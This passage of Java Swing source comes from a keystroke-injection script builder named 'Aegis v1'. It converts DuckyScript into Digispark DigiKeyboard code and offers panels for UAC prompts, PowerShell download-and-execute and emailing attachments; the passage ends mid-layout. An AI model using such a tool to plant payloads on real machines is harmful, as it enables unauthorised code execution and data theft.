/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package digiscriptwriter;

import java.awt.Color;
import java.awt.Desktop;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.dnd.DnDConstants;
import java.awt.dnd.DropTarget;
import java.awt.dnd.DropTargetDragEvent;
import java.awt.dnd.DropTargetDropEvent;
import java.awt.dnd.DropTargetEvent;
import java.awt.dnd.DropTargetListener;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.JOptionPane;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyledDocument;

/**
 *
 * @author Rengi
 */
public class digiScriptWriterF extends javax.swing.JFrame {

    /**
     * Creates new form digiScriptWriterF
     */
    public digiScriptWriterF() {
        initComponents();
        setIcon();
 
        document = tbxConsole.getStyledDocument();
        send2Consoleln(new Color(214, 102, 255), "==========================  ==================");
        send2Consoleln(new Color(214, 102, 255), "|| Thanks for using Aegis v1 by: AyeRengi ||   || Default Delay set to: " + tbxDefaultDelay.getText() + " ||");
        send2Consoleln(new Color(214, 102, 255), "==========================  ==================\n");
        //send2Consoleln(Color.GRAY, "Start-up info:\n -Default Delay set to: " + tbxDefaultDelay.getText());
        
        DropTarget target=new DropTarget(lblDrag,new DropTargetListener(){
            public void dragEnter(DropTargetDragEvent e)
            {
            }
            
            public void dragExit(DropTargetEvent e)
            {
            }
            
            public void dragOver(DropTargetDragEvent e)
            {
            }
            
            public void dropActionChanged(DropTargetDragEvent e)
            {
            
            }
            
            public void drop(DropTargetDropEvent e)
            {
                try
                {
                    // Accept the drop first, important!
                    e.acceptDrop(DnDConstants.ACTION_COPY_OR_MOVE);
                    
                    // Get the files that are dropped as java.util.List
                    java.util.List list=(java.util.List) e.getTransferable().getTransferData(DataFlavor.javaFileListFlavor);
                    
                    // Now get the first file from the list,
                    File file=(File)list.get(0);
                    
                    if(file.getName().contains(".txt") || file.getName().contains(".TXT"))
                        convertDS(file);
                    else
                        send2Consoleln(Color.RED, "Error: file may not be a text document !");
                    
                    
                    
                    
                }catch(Exception ex){}
            }
        });
        DropTarget targ=new DropTarget(txtbScript,new DropTargetListener(){
            public void dragEnter(DropTargetDragEvent e)
            {
            }
            
            @Override
            public void dragExit(DropTargetEvent e)
            {
            }
            
            public void dragOver(DropTargetDragEvent e)
            {
            }
            
            public void dropActionChanged(DropTargetDragEvent e)
            {
            
            }
            
            public void drop(DropTargetDropEvent e)
            {
                try
                {
                    // Accept the drop first, important!
                    e.acceptDrop(DnDConstants.ACTION_COPY_OR_MOVE);
                    
                    // Get the files that are dropped as java.util.List
                    java.util.List list=(java.util.List) e.getTransferable().getTransferData(DataFlavor.javaFileListFlavor);
                    
                    // Now get the first file from the list,
                    File file=(File)list.get(0);
                    FileReader read = new FileReader(file);
                    if(file.getName().contains(".txt") || file.getName().contains(".TXT")){
                        txtbScript.read(read, file);
                        scriptText = txtbScript.getText();
                        send2Console(Color.YELLOW, "Loaded DigiScript: ");
                        send2Consoleln(Color.white, "\""+ file.getName() + "\"");
                    }
                    else
                        send2Consoleln(Color.RED, "Error: file may not be a text document !");
                    
                    
                    
                    
                }catch(Exception ex){}
            }
        });
    }
    
    public void convertDS(File file) throws FileNotFoundException{
        String[] alreadyInCode = {"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
                                  "0","1","2","3","4","5","6","7","8","9",
                                  "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12",
                                  "ENTER"};
        
        String[][] commands = {{"NUMLOCK","PRINTSCREEN","SCROLLLOCK","BREAK","PAUSE","CAPSLOCK","ALT","CTRL","SHIFT","END", "ESC", "ESCAPE", "SHIFT", "DELETE", "HOME", "INSERT", "PAGEUP", "PAGEDOWN", "WINDOWS", "GUI", "UPARROW", "DOWNARROW", "LEFTARROW", "RIGHTARROW", "TAB"},
                               {""}};
        Scanner sc = new Scanner(file);
        String temp = "//DuckyScript converted using Aegis";
        while(sc.hasNextLine()){
            String holder = sc.next() + " ";
            
            if(holder.contains("REM"))
                holder = "\n//";
            
            if(holder.contains("ENTER"))
                holder = sendKeyStroke("KEY_ENTER");
            
            if(holder.contains("STRING")){
                String toSend = sc.nextLine();
                toSend = toSend.replace("\\", "\\\\");
                toSend = toSend.replace("\"","\\\"");
                holder = sendString(toSend.substring(1));
            }
            
            if(holder.contains("DELAY")){
                String toSend = sc.nextLine();
                holder = addDelay(toSend.substring(1));
            }
                
            if((holder.contains("GUI") || holder.contains("WINDOWS"))){
                String toSend = sc.nextLine();
                for(String x : alreadyInCode){
                    if(toSend.contains(x)){
                        toSend = "KEY_" + x.toUpperCase();
                    }
                }
                if(toSend.length() != 0)
                    holder = sendKeyStroke(toSend + ", MOD_GUI_LEFT");
                else
                    holder = sendKeyStroke("0, MOD_GUI_LEFT");
            }
            
            temp += holder;
        }
        
        
        
        txtbScript.setText(temp);
        send2Console(Color.yellow, "Success! Converted to DigiScript: ");
        send2Consoleln(Color.white, "\""+ file.getName() + "\"");
        
    }
    
    public void send2Consoleln(Color c, String msg){       
            Style style = tbxConsole.addStyle("style", null);
            StyleConstants.setForeground(style, c);
            
            try{
                document.insertString(document.getLength(),msg + "\n", style);
            }catch(Exception e){
                
            }
    }
    public void send2Console(Color c, String msg){       
            Style style = tbxConsole.addStyle("style", null);
            StyleConstants.setForeground(style, c);
            
            try{
                document.insertString(document.getLength(),msg, style);
            }catch(Exception e){
                
            }
    }
    
    public String sendKeyStroke(String keyStroke){

        return "\nDigiKeyboard.sendKeyStroke("+keyStroke+");";
    }
    public String sendString(String String){

        return "\nDigiKeyboard.print(F(\""+ String + "\"));";
    }
    
    public String addDelay(String delay){

        return "\nDigiKeyboard.delay("+ delay + ");";
    }

    
    @SuppressWarnings("unchecked")
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jScrollPane1 = new javax.swing.JScrollPane();
        txtbScript = new javax.swing.JTextArea();
        jTabbedPane1 = new javax.swing.JTabbedPane();
        jPanel1 = new javax.swing.JPanel();
        jPanel4 = new javax.swing.JPanel();
        tbxDefaultDelay = new javax.swing.JTextField();
        lblAddDelay = new javax.swing.JLabel();
        tbxAddDelay = new javax.swing.JTextField();
        btnAddDelay = new javax.swing.JButton();
        chkDefaultDelay = new javax.swing.JCheckBox();
        jPanel5 = new javax.swing.JPanel();
        btnGUI = new javax.swing.JButton();
        btnRunAs = new javax.swing.JButton();
        btnEnter = new javax.swing.JButton();
        btnUAC = new javax.swing.JButton();
        btnRunBox = new javax.swing.JButton();
        btnTab = new javax.swing.JButton();
        btnEsc = new javax.swing.JButton();
        btnCaps = new javax.swing.JButton();
        jPanel11 = new javax.swing.JPanel();
        tbxCustomKey = new javax.swing.JTextField();
        btnAddCustomKey = new javax.swing.JButton();
        jButton3 = new javax.swing.JButton();
        jPanel6 = new javax.swing.JPanel();
        tbxText2Write = new javax.swing.JTextField();
        btnText2Write = new javax.swing.JButton();
        jPanel12 = new javax.swing.JPanel();
        btnAddComment = new javax.swing.JButton();
        tbxComment = new javax.swing.JTextField();
        jPanel2 = new javax.swing.JPanel();
        jPanel7 = new javax.swing.JPanel();
        lblDLURL = new javax.swing.JLabel();
        tbxDownloadURL = new javax.swing.JTextField();
        lblDLPath = new javax.swing.JLabel();
        tbxDownloadPath = new javax.swing.JTextField();
        btnDownload = new javax.swing.JButton();
        chkExecute = new javax.swing.JCheckBox();
        jPanel13 = new javax.swing.JPanel();
        jPanel8 = new javax.swing.JPanel();
        lblSenderEmail = new javax.swing.JLabel();
        tbxSenderEmail = new javax.swing.JTextField();
        lblSenderPass = new javax.swing.JLabel();
        tbxSMTP = new javax.swing.JTextField();
        jLabel2 = new javax.swing.JLabel();
        tbxPassword = new javax.swing.JPasswordField();
        tbxPort = new javax.swing.JTextField();
        jLabel5 = new javax.swing.JLabel();
        jPanel3 = new javax.swing.JPanel();
        lblSendEmailTo = new javax.swing.JLabel();
        tbxReceiverEmail = new javax.swing.JTextField();
        lblSubject = new javax.swing.JLabel();
        tbxSubject = new javax.swing.JTextField();
        jLabel1 = new javax.swing.JLabel();
        tbxMessage = new javax.swing.JTextField();
        chkAttachment = new javax.swing.JCheckBox();
        tbxAttachPath = new javax.swing.JTextField();
        btnSendMail = new javax.swing.JButton();
        plDragDrop = new javax.swing.JPanel();
        lblDrag = new javax.swing.JLabel();
        jPanel9 = new javax.swing.JPanel();
        jScrollPane3 = new javax.swing.JScrollPane();
        jTextArea2 = new javax.swing.JTextArea();
        jScrollPane2 = new javax.swing.JScrollPane();
        jTextArea1 = new javax.swing.JTextArea();
        jLabel6 = new javax.swing.JLabel();
        btnClearScript = new javax.swing.JButton();
        jButton1 = new javax.swing.JButton();
        btnSave = new javax.swing.JButton();
        jScrollPane4 = new javax.swing.JScrollPane();
        tbxConsole = new javax.swing.JTextPane();

        setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);
        setTitle("Aegis v1");
        setBackground(new java.awt.Color(0, 102, 153));
        setResizable(false);

        txtbScript.setEditable(false);
        txtbScript.setColumns(20);
        txtbScript.setRows(5);
        txtbScript.setText("//Script created using Aegis");
        jScrollPane1.setViewportView(txtbScript);

        jPanel4.setBorder(javax.swing.BorderFactory.createTitledBorder("Delays"));

        tbxDefaultDelay.setText("500");

        lblAddDelay.setText("Enter a Delay:");

        tbxAddDelay.setText("1000");

        btnAddDelay.setText("Add");
        btnAddDelay.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnAddDelayActionPerformed(evt);
            }
        });

        chkDefaultDelay.setSelected(true);
        chkDefaultDelay.setText("Default Delay: ");
        chkDefaultDelay.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                chkDefaultDelayActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel4Layout = new javax.swing.GroupLayout(jPanel4);
        jPanel4.setLayout(jPanel4Layout);
        jPanel4Layout.setHorizontalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addComponent(btnAddDelay, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(jPanel4Layout.createSequentialGroup()
                        .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(chkDefaultDelay)
                            .addComponent(lblAddDelay))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                            .addComponent(tbxDefaultDelay, javax.swing.GroupLayout.PREFERRED_SIZE, 54, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(tbxAddDelay, javax.swing.GroupLayout.PREFERRED_SIZE, 54, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel4Layout.setVerticalGroup(
            jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel4Layout.createSequentialGroup()
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(chkDefaultDelay)
                    .addComponent(tbxDefaultDelay, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel4Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblAddDelay)
                    .addComponent(tbxAddDelay, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(btnAddDelay)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel5.setBorder(javax.swing.BorderFactory.createTitledBorder("Useful Keys"));

        btnGUI.setText("Windows");
        btnGUI.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnGUIActionPerformed(evt);
            }
        });

        btnRunAs.setText("Run As");
        btnRunAs.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnRunAsActionPerformed(evt);
            }
        });

        btnEnter.setText("Enter");
        btnEnter.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnEnterActionPerformed(evt);
            }
        });

        btnUAC.setText("UAC");
        btnUAC.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnUACActionPerformed(evt);
            }
        });

        btnRunBox.setText("Run box");
        btnRunBox.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnRunBoxActionPerformed(evt);
            }
        });

        btnTab.setText("TAB");
        btnTab.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnTabActionPerformed(evt);
            }
        });

        btnEsc.setText("ESC");
        btnEsc.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnEscActionPerformed(evt);
            }
        });

        btnCaps.setText("CAPS");
        btnCaps.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnCapsActionPerformed(evt);
            }
        });

        jPanel11.setBorder(javax.swing.BorderFactory.createTitledBorder("Custom Key"));

        btnAddCustomKey.setText("Add");
        btnAddCustomKey.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnAddCustomKeyActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel11Layout = new javax.swing.GroupLayout(jPanel11);
        jPanel11.setLayout(jPanel11Layout);
        jPanel11Layout.setHorizontalGroup(
            jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel11Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(tbxCustomKey, javax.swing.GroupLayout.PREFERRED_SIZE, 76, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(117, 117, 117))
            .addGroup(jPanel11Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(btnAddCustomKey, javax.swing.GroupLayout.PREFERRED_SIZE, 76, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel11Layout.setVerticalGroup(
            jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel11Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(tbxCustomKey, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(btnAddCustomKey)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jButton3.setText("All Custom Key Codes (Pages 53-59)");
        jButton3.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton3ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);
        jPanel5.setLayout(jPanel5Layout);
        jPanel5Layout.setHorizontalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addGap(7, 7, 7)
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addGroup(jPanel5Layout.createSequentialGroup()
                        .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(btnRunBox, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(btnEnter, javax.swing.GroupLayout.PREFERRED_SIZE, 74, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(btnRunAs, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(btnGUI))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(btnUAC, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(btnTab, javax.swing.GroupLayout.PREFERRED_SIZE, 70, javax.swing.GroupLayout.PREFERRED_SIZE))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(btnEsc, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addComponent(btnCaps, javax.swing.GroupLayout.PREFERRED_SIZE, 70, javax.swing.GroupLayout.PREFERRED_SIZE)))
                    .addComponent(jButton3, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jPanel11, javax.swing.GroupLayout.PREFERRED_SIZE, 107, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        jPanel5Layout.setVerticalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jPanel11, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(jPanel5Layout.createSequentialGroup()
                        .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(btnEnter)
                            .addComponent(btnGUI)
                            .addComponent(btnTab)
                            .addComponent(btnEsc))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                            .addComponent(btnRunBox)
                            .addComponent(btnRunAs)
                            .addComponent(btnUAC)
                            .addComponent(btnCaps))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jButton3)))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel6.setBorder(javax.swing.BorderFactory.createTitledBorder("Write Text"));

        tbxText2Write.setText("Text 2 Write!");

        btnText2Write.setText("Add");
        btnText2Write.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnText2WriteActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel6Layout = new javax.swing.GroupLayout(jPanel6);
        jPanel6.setLayout(jPanel6Layout);
        jPanel6Layout.setHorizontalGroup(
            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel6Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(tbxText2Write, javax.swing.GroupLayout.DEFAULT_SIZE, 232, Short.MAX_VALUE)
                    .addComponent(btnText2Write, javax.swing.GroupLayout.DEFAULT_SIZE, 232, Short.MAX_VALUE))
                .addContainerGap())
        );
        jPanel6Layout.setVerticalGroup(
            jPanel6Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel6Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(tbxText2Write, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(18, 18, 18)
                .addComponent(btnText2Write)
                .addContainerGap(12, Short.MAX_VALUE))
        );

        jPanel12.setBorder(javax.swing.BorderFactory.createTitledBorder("Add Comment"));

        btnAddComment.setText("Add");
        btnAddComment.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnAddCommentActionPerformed(evt);
            }
        });

        tbxComment.setText("Write Comment");

        javax.swing.GroupLayout jPanel12Layout = new javax.swing.GroupLayout(jPanel12);
        jPanel12.setLayout(jPanel12Layout);
        jPanel12Layout.setHorizontalGroup(
            jPanel12Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel12Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel12Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(tbxComment)
                    .addComponent(btnAddComment, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                .addContainerGap())
        );
        jPanel12Layout.setVerticalGroup(
            jPanel12Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel12Layout.createSequentialGroup()
                .addContainerGap(27, Short.MAX_VALUE)
                .addComponent(tbxComment, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(btnAddComment)
                .addGap(23, 23, 23))
        );

        javax.swing.GroupLayout jPanel1Layout = new javax.swing.GroupLayout(jPanel1);
        jPanel1.setLayout(jPanel1Layout);
        jPanel1Layout.setHorizontalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel5, javax.swing.GroupLayout.PREFERRED_SIZE, 0, Short.MAX_VALUE)
                    .addComponent(jPanel12, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                    .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel1Layout.createSequentialGroup()
                        .addComponent(jPanel4, javax.swing.GroupLayout.PREFERRED_SIZE, 179, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(jPanel6, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );
        jPanel1Layout.setVerticalGroup(
            jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel1Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel1Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(jPanel4, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jPanel6, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(20, 20, 20)
                .addComponent(jPanel5, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGap(28, 28, 28)
                .addComponent(jPanel12, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(106, 106, 106))
        );

        jTabbedPane1.addTab("Main Commands", jPanel1);

        jPanel7.setBorder(javax.swing.BorderFactory.createTitledBorder("Download File (Powershell Command)"));

        lblDLURL.setText("Download URL:");

        lblDLPath.setText("Save File Path:");

        btnDownload.setIcon(new javax.swing.ImageIcon(getClass().getResource("/digiscriptwriter/adminLogo2.png"))); // NOI18N
        btnDownload.setText("Add Download");
        btnDownload.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDownloadActionPerformed(evt);
            }
        });

        chkExecute.setText("Download & Execute");

        javax.swing.GroupLayout jPanel7Layout = new javax.swing.GroupLayout(jPanel7);
        jPanel7.setLayout(jPanel7Layout);
        jPanel7Layout.setHorizontalGroup(
            jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel7Layout.createSequentialGroup()
                .addGap(13, 13, 13)
                .addGroup(jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING)
                    .addGroup(jPanel7Layout.createSequentialGroup()
                        .addGroup(jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(lblDLURL)
                            .addComponent(lblDLPath))
                        .addGap(22, 22, 22)
                        .addGroup(jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(tbxDownloadPath)
                            .addComponent(tbxDownloadURL)))
                    .addGroup(jPanel7Layout.createSequentialGroup()
                        .addComponent(chkExecute)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 146, Short.MAX_VALUE)
                        .addComponent(btnDownload, javax.swing.GroupLayout.PREFERRED_SIZE, 148, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
        );
        jPanel7Layout.setVerticalGroup(
            jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel7Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblDLURL)
                    .addComponent(tbxDownloadURL, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(18, 18, 18)
                .addGroup(jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(lblDLPath)
                    .addComponent(tbxDownloadPath, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel7Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(btnDownload)
                    .addComponent(chkExecute))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jPanel13.setBorder(javax.swing.BorderFactory.createTitledBorder("Send Email (PowerShell Command)"));

        jPanel8.setBorder(javax.swing.BorderFactory.createTitledBorder(""));

        lblSenderEmail.setText("Sender Email:");

        lblSenderPass.setText("Sender Pass:");

        tbxSMTP.setText("smtp.gmail.com");

        jLabel2.setText("SMTP:");

        tbxPort.setText("587");

        jLabel5.setText("PORT:");

        javax.swing.GroupLayout jPanel8Layout = new javax.swing.GroupLayout(jPanel8);
        jPanel8.setLayout(jPanel8Layout);
        jPanel8Layout.setHorizontalGroup(
            jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel8Layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel2)
                    .addComponent(jLabel5))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
